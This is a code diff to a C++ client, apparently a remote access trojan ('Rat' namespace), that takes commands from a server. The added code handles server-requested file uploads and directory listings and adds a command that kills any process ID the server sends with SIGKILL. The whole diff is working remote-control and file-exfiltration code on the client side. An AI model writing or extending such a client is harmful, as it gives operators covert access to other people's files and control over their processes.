@@ -3,6 +3,8 @@
 #include <thread>
 #include <random>
 #include <fstream>
+#include <csignal>     
+#include <unistd.h>   
 #include "FileSender.hpp"
 #include "ProcessUtils.hpp"
 #include "FileFolderUtils.hpp"
@@ -255,6 +257,29 @@ namespace Rat
                             std::cout << "COMMAND TYPE FROM SERVER: "  << packet.type() << std::endl;
                             std::cout << "COMMAND PAYLOAD FROM SERVER: " << packet.chunked_data().payload() << std::endl;
                             std::cout << "COMMAND FILE PATH FROM SERVER: " << packet.file_path() << std::endl;
+                            std::ifstream test_file(packet.file_path(), std::ios::binary);
+                            if (!test_file.is_open()) 
+                            {
+                                rat::Packet error_packet;
+                                error_packet.set_type(rat::Packet::TRANSFER_FILE);
+                                error_packet.set_packet_id(packet.packet_id());
+                                error_packet.set_source_id("client_" + std::to_string(this_id_));
+                                error_packet.set_destination_id("server_0");
+                                error_packet.set_encrypted(true);
+
+                                auto* chunk = error_packet.mutable_chunked_data();
+                                chunk->set_data_id(packet.chunked_data().data_id());
+                                chunk->set_sequence_number(0);
+                                chunk->set_total_chunks(1);
+                                chunk->set_payload("TRANSFER FILE | ARGUMENT ERROR | CANNOT OPEN FILE: " + packet.file_path());
+                                chunk->set_success(false);
+
+                                networkManager_.send(socket_, error_packet, [](const boost::system::error_code& ec) {
+                                    if (ec) std::cerr << "Send error (TRANSFER_FILE error): " << ec.message() << std::endl;
+                                });
+                                boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
+                                return;
+                            }
                             current_file_sender_ = std::make_shared<FileSender>(socket_, networkManager_, this_id_, packet.file_path());
                             current_file_sender_->sendFile(
                                 packet.file_path(),
@@ -286,7 +311,29 @@ namespace Rat
                             std::cout << "COMMAND TYPE FROM SERVER: "  << packet.type() << std::endl;
                             std::cout << "COMMAND PAYLOAD FROM SERVER: " << packet.chunked_data().payload() << std::endl;
                             // note check if path/level = packet.chunked_data().payload() not ok before listFilesFolders 
-                            std::string file_folder_data = FileFolderUtils::listFilesFolders(packet.chunked_data().payload()); 
+                            std::string response_list_files_folders = "LIST FILES AND FOLDER | SUCCESS";
+                            std::string file_folder_data = FileFolderUtils::listFilesFolders(packet.chunked_data().payload(), response_list_files_folders); 
+                            if(response_list_files_folders != "LIST FILES AND FOLDER | SUCCESS")
+                            {
+                                rat::Packet packet_list_files_folders;
+                                packet_list_files_folders.set_type(rat::Packet::LIST_FILES_FOLDERS);
+                                packet_list_files_folders.set_packet_id(packet.packet_id());
+                                packet_list_files_folders.set_source_id("client_" + std::to_string(this_id_));
+                                packet_list_files_folders.set_destination_id("server_0");
+                                packet_list_files_folders.set_encrypted(true);
+                                auto* chunk = packet_list_files_folders.mutable_chunked_data();
+                                chunk->set_data_id(packet.chunked_data().data_id());
+                                chunk->set_sequence_number(0);
+                                chunk->set_total_chunks(1);
+                                chunk->set_payload(response_list_files_folders);
+                                chunk->set_success(false);
+                                networkManager_.send(socket_, packet_list_files_folders, [](const boost::system::error_code& ec) 
+                                {
+                                    if (ec) std::cout << "Send error: " << ec.message() << "\n";
+                                });
+                                boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
+                                return;
+                            }
                             std::cout << "Debug size of file/folder list: " << file_folder_data.size() << std::endl;
 
                             current_file_folder_sender_ = std::make_shared<FileFolderSender>(socket_, networkManager_, this_id_, file_folder_data);
@@ -346,6 +393,60 @@ namespace Rat
                                 }
                             );
                             return;
+                        }
+                        case rat::Packet::KILL_PROCESS:
+                        {
+                            
+                            std::string result_kill_process = "KILL PROCESS | SUCCESS";
+                            auto pid = -1;
+                            try 
+                            {
+                                pid = std::stol(packet.chunked_data().payload());
+                            } 
+                            catch (const std::exception& e) 
+                            {
+                                pid = -1;
+                            }
+                            rat::Packet packet_kill_process;
+                            packet_kill_process.set_type(rat::Packet::KILL_PROCESS);
+                            packet_kill_process.set_packet_id(packet.packet_id());
+                            packet_kill_process.set_source_id("client_" + std::to_string(this_id_));
+                            packet_kill_process.set_destination_id("server_0");
+                            packet_kill_process.set_encrypted(true);
+                            auto* chunk = packet_kill_process.mutable_chunked_data();
+                            chunk->set_data_id(packet.chunked_data().data_id());
+                            chunk->set_sequence_number(0);
+                            chunk->set_total_chunks(1);
+                            if (pid == -1)
+                            {
+                                result_kill_process = "KILL PROCESS | ERROR PID NAME";
+                                chunk->set_payload(result_kill_process);
+                                chunk->set_success(true);
+                                networkManager_.send(socket_, packet_kill_process, [](const boost::system::error_code& ec) 
+                                {
+                                    if (ec) std::cout << "Send error: " << ec.message() << "\n";
+                                });
+                                boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
+                                return;
+                            }
+                            
+                            if (kill(pid, SIGKILL) == 0) 
+                            {
+                                std::cout << "Process " << pid << " is killed.\n";
+                            } 
+                            else 
+                            {
+                                result_kill_process = "KILL PROCESS | ERROR";
+                                perror("Error kill process.\n");
+                            }
+                            chunk->set_payload(result_kill_process);
+                            chunk->set_success(true);
+                            networkManager_.send(socket_, packet_kill_process, [](const boost::system::error_code& ec) 
+                            {
+                                if (ec) std::cout << "Send error: " << ec.message() << "\n";
+                            });                            
+                            boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
+                            break;
                         }
                         default:
                         {
